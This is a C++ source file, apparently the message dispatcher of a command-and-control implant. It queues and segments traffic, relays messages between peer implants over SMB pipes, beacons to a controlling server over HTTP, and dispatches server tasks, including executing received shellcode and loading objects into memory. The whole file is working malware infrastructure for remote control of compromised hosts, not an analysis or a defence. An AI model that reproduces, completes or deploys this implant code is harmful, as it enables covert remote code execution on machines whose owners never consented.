#include <core/include/dispatch.hpp>

using namespace Utils;
using namespace Peers;
using namespace Stream;
using namespace Parser;
using namespace Network::Smb;
using namespace Network::Http;
using namespace Memory::Execute;

namespace Dispatcher {

    VOID AddMessage(_stream *out) {
        HEXANE;

        auto head = ctx->transport.message_queue;

        if (!ctx->transport.message_queue) {
            ctx->transport.message_queue = out;
        }
        else {
            while (head->next) {
                head = head->next;
            }

            head->next = out;
        }
    }

    VOID RemoveMessage(_stream *target) {
        HEXANE;

        _stream *prev = { };

        if (!ctx->transport.message_queue || !target) {
            return;
        }

        for (auto head = ctx->transport.message_queue; head; head = head->next) {
            if (head == target) {
                if (prev) {
                    prev->next = head->next;
                }
                else {
                    ctx->transport.message_queue = head->next;
                }

                DestroyStream(head);
                return;

            }

            prev = head;
        }
    }

    VOID MessageQueue(_stream *msg) {
        HEXANE;

        _parser parser = { };
        _stream *queue = { };

        if (msg->length > MESSAGE_MAX) {
            QueueSegments(B_PTR(msg->buffer), msg->length);
        }
        else {
            CreateParser(&parser, B_PTR(msg->buffer), msg->length);

            queue            = CreateStream();
            queue->peer_id   = __builtin_bswap32(UnpackUint32(&parser));
            queue->task_id   = __builtin_bswap32(UnpackUint32(&parser));
            queue->msg_type  = __builtin_bswap32(UnpackUint32(&parser));

            queue->length   = parser.Length;
            queue->buffer   = B_PTR(Realloc(queue->buffer, queue->length));

            MemCopy(queue->buffer, parser.buffer, queue->length);
            AddMessage(queue);

            DestroyParser(&parser);
            DestroyStream(msg);
        }
    }

    VOID QueueSegments(uint8_t *buffer, uint32_t length) {
        HEXANE;

        _stream *queue = { };

        uint32_t offset     = 0;
        uint32_t peer_id    = 0;
        uint32_t task_id    = 0;
        uint32_t cb_seg     = 0;
        uint32_t index      = 1;

        const auto n_seg        = (length + MESSAGE_MAX - 1) / MESSAGE_MAX;
        constexpr auto m_max    = MESSAGE_MAX - SEGMENT_HEADER_SIZE;

        while (length > 0) {
            cb_seg  = length > m_max ? m_max : length;
            queue   = (_stream*) Malloc(cb_seg + SEGMENT_HEADER_SIZE);

            MemCopy(&peer_id, buffer, 4);
            MemCopy(&task_id, buffer + 4, 4);

            queue->peer_id    = peer_id;
            queue->task_id    = task_id;
            queue->msg_type   = TypeSegment;

            PackUint32(queue, index);
            PackUint32(queue, n_seg);
            PackUint32(queue, cb_seg);
            PackBytes(queue, B_PTR(buffer) + offset, cb_seg);

            length -= cb_seg;
            offset += cb_seg;
            index++;

            AddMessage(queue);
        }
    }

    VOID PrepareEgress(_stream *out) {
        HEXANE;

        _parser parser = { };

        for (auto head = ctx->transport.message_queue; head; head = head->next) {
            if (head->buffer) {
                CreateParser(&parser, B_PTR(head->buffer), head->length);

                PackUint32(out, head->peer_id);
                PackUint32(out, head->task_id);
                PackUint32(out, head->msg_type);

                if (ROOT_NODE) {
                    PackBytes(out, B_PTR(head->buffer), head->length);
                }
                else {
                    AppendBuffer(&out->buffer, head->buffer, (uint32_t*) &out->length, head->length);
                }
                break;
            }
        }

        DestroyParser(&parser);
    }

    VOID PrepareIngress(_stream *in) {
        HEXANE;

        if (in) {
            if (PeekPeerId(in) != ctx->session.peer_id) {
                MessageQueue(in);
            }
            else {
                CommandDispatch(in);
            }
        }
        else {
            auto head = ctx->transport.message_queue;
            while (head) {
                head->ready = FALSE;
                head = head->next;
            }
        }
    }

    BOOL DispatchRoutine() {
        HEXANE;

        bool success    = true;
        _stream *out    = CreateStream();
        _stream *in     = { };

    retry:
        if (!ctx->transport.message_queue) {
            if (ROOT_NODE) {
                MessageQueue(CreateStreamWithHeaders(TypeTasking));
                goto retry;
            }
            else {
                return success;
            }
        }

        PrepareEgress(out);

        if (ROOT_NODE) {
            if (!HttpCallback(&in, out)) {
                success = false;
                goto defer;
            }
        }
        else {
            if (!PipeSend(out) || !PipeReceive(&in)) {
                success = false;
                goto defer;
            }
        }

        PrepareIngress(in);
        PushPeers();

    defer:
        DestroyStream(out);
        return success;
    }

    VOID CommandDispatch (_stream *in) {
        HEXANE;

        _parser parser = { };

        CreateParser(&parser, B_PTR(in->buffer), in->length);
        UnpackUint32(&parser);

        auto task_id = UnpackUint32(&parser);
        MemCopy(&ctx->session.current_taskid, &task_id, sizeof(uint32_t));

        switch (UnpackUint32(&parser)) {
            case TypeCheckin:   MemSet(&ctx->session.checkin, true, sizeof(bool)); break;
            case TypeTasking:   ExecuteCommand(parser); break;
            case TypeExecute:   ExecuteShellcode(parser); break;
            case TypeObject:    LoadObject(parser); break;

            default:
                break;
        }

        DestroyParser(&parser);
    }
}
